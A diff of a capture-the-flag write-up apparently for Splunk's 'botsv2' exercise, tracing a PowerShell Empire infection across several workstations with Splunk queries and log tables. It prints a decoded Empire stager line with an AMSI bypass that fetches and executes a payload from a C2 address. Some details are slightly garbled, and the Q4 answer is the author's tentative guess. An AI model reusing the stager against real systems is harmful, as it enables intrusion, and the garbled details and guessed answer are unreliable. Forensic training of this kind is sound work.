@@ -795,7 +795,7 @@ C = US 	14,189 	58.981%
 
 **Q4 What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith**
 
-(might be a trick question the names Ryan and Kovar don't appear together in any of the packets linked with empire) 
+There is nothing in the scripts or events on either system that points to Ryan Kovar. Billy Tun's workstation appeared to run empire first.
 
 - Since Empire is related to powershell I started with: 
 ```
@@ -814,7 +814,6 @@ AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 ```
 [ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed',....
 ;$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
-```
 
 **Key Indicators**
 
@@ -834,6 +833,132 @@ Connection to attacker C2 IP we have seen earlier:
 Downloads the payload, decrypts and executes with IEX.
 
 The other FTP command was related but don't directly to this stager.
+
+```
+
+```
+Closer look at command line field in interesting fields there was unusual ftp download
+
+Most files in FTP traffic listed had some purpose likely related to C2 interactions:
+Earlier powershell commands run after these files were transferred by FTP by 2 days. FTP method = RETR.
+
+```
+index=botsv2  sourcetype="stream:ftp" ("GET" OR "RETR")
+```
+From the 14 results the following appear twice.
+```
+FileLikely 					Purpose
+나는_데이비드를_사랑한다.hwp	Initial lure document used for infection.
+psexec.exe					Lateral movement and remote command execution. Common attacker tool.
+nc.exe						Netcat. Reverse shells, bind shells, port forwarding.wget64.exeDownload additional payloads/tools.
+python-2.7.6.amd64.msi		Install Python runtime on compromised systems.
+dns.py						Potential custom script. Worth investigating. Name suggests DNS-related functionality.
+winsys64.dll				Highly suspicious. In your Sysmon events it is used as an FTP script file via ftp.exe -i -s:winsys64.dll. Likely not actually a DLL. Two files similar name one is *32.dll other is *64.dll.
+```
+Downloads on each of 2 systems:
+```
+Victim 1 wrk-btun
+Time (UTC)		Source IP	Destination IP	File
+2017-08-24 03:36:15	10.0.2.107	160.153.91.7:21	dns.py
+2017-08-24 03:36:15	10.0.2.107	160.153.91.7:21	nc.exe
+2017-08-24 03:36:16	10.0.2.107	160.153.91.7:21	psexec.exe
+2017-08-24 03:36:16	10.0.2.107	160.153.91.7:21	python-2.7.6.amd64.msi
+2017-08-24 03:36:30	10.0.2.107	160.153.91.7:21	wget64.exe
+2017-08-24 03:36:33	10.0.2.107	160.153.91.7:21	winsys64.dll
+2017-08-24 03:36:34	10.0.2.107	160.153.91.7:21	나는_데이비드를_사랑한다.hwp
+
+Victim 2 wrk-klagerf
+Time (UTC)	Source IP	Destination IP	File
+2017-08-24 03:59:57	10.0.2.109	160.153.91.7:21	dns.py
+2017-08-24 03:59:57	10.0.2.109	160.153.91.7:21	nc.exe
+2017-08-24 03:59:58	10.0.2.109	160.153.91.7:21	psexec.exe
+2017-08-24 03:59:58	10.0.2.109	160.153.91.7:21	python-2.7.6.amd64.msi
+2017-08-24 04:00:12	10.0.2.109	160.153.91.7:21	wget64.exe
+2017-08-24 04:00:16	10.0.2.109	160.153.91.7:21	winsys64.dll
+2017-08-24 04:00:16	10.0.2.109	160.153.91.7:21	나는_데이비드를_사랑한다.hwp
+
+```
+
+From earlier search, taking more in depth look at those related to other command listed for FTP using winsys64.dll we have 3 events:
+```
+index=botsv2  sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" powershell cmdline="\"C:\\Windows\\system32\\ftp.exe\"  -i -s:winsys64.dll"
+```
+It turns out they are also repeated with winsys32.dll:
+```
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" powershell winsys32.dll
+```
+Date			Host			User			FTP Script		Cookie
+24 Aug 03:36	wrk-btun	billy.tun		winsys32.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
+24 Aug 04:00	wrk-klagerf	service3		winsys32.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
+24 Aug 04:07	venus		service3		winsys32.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
+26 Aug 05:28	wrk-klagerf	service3		winsys64.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
+26 Aug 05:42	wrk-btun	billy.tun		winsys64.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
+26 Aug 06:13	wrk-btun	billy.tun		winsys64.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
+
+
+Looking closer these look likely post compromise activity downloading the same events encoded script from earlier finding:
+
+Source IP		Destination IP	Destination Port
+10.0.2.109		160.153.91.721 (FTP)					
+
+Where ['/admin/get.php'](https://45.77.65.211/admin/get.php) is likely path to attackers server.
+
+Time (UTC)			Host		User				Child Process				Parent Process
+2017-08-24 03:36:49	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys32.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
+2017-08-24 04:00:30	wrk-klagerf	FROTHLY\service3	ftp.exe -i -s:winsys32.dll	powershell.exe -nop -sta -w 1 -enc ...
+2017-08-24 04:07:27	venus		FROTHLY\service3	ftp.exe -i -s:winsys32.dll	powershell.exe -nop -sta -w 1 -enc ...
+2017-08-26 05:28:57	wrk-klagerf	FROTHLY\service3	ftp.exe -i -s:winsys64.dll	powershell.exe -nop -sta -w 1 -enc ...
+2017-08-26 05:42:06	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys64.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
+2017-08-26 06:13:34	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys64.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
+
+Observation
+
+Observation				Details
+Earliest event			03:36:49 on billy.tun
+Same malware			All events contain the same Empire stager that reaches out to 45.77.65.211:443/admin/get.php
+Same follow-on action	All launch ftp.exe -i -s:winsys32.dll or winsys64.dll 
+Different accounts		service3 and billy.tun
+Different hosts			wrk-klagerf, venus and wrk-btun
+Likely significance		Indicates compromise of multiple systems, or lateral movement using the same Empire payload
+
+
+**This korean file was downloaded and empire run on two machines:**
+
+**wrk-btun**
+
+- 03:36:34.077 FTP transfer of: 나는_데이비드를_사랑한다.hwp
+- 03:36:49.192 powershell.exe (Empire stager)
+				↓
+		ftp.exe -i -s:winsys32.dll
+
+About 15 seconds later
+
+**wrk-klagerf**
+- 04:00:16.831 FTP transfer of: 나는_데이비드를_사랑한다.hwp
+- 04:00:30.683 powershell.exe (Empire stager)
+				↓
+		ftp.exe -i -s:winsys32.dll	
+
+**What you can say is based on earliest 3 events:**
+
+- The HWP transfer and the Empire-spawned
+- ftp.exe -i -s:winsys32.dll execution occurred
+- within approximately 14 seconds of each other
+- on the same compromise timeline.
+
+HWP documents have historically been used in phishing and malware campaigns targeting Korean users because:
+
+- They're common in South Korea.
+- Like Office documents, they can contain embedded objects and exploit vulnerable software.
+- Many threat actors have used malicious HWP attachments to deliver payloads.
+
+I think the answer is more likely Billy Tun than Ryan Kovar which does not seem related.
+Just one email with kovar@yahoo.com.tw ryan appears part of name in 18 emails not with kovar same event.
+
+
+
+
+
 
 **Q5 Within the document, what kind of points is mentioned if you found the text?**
 
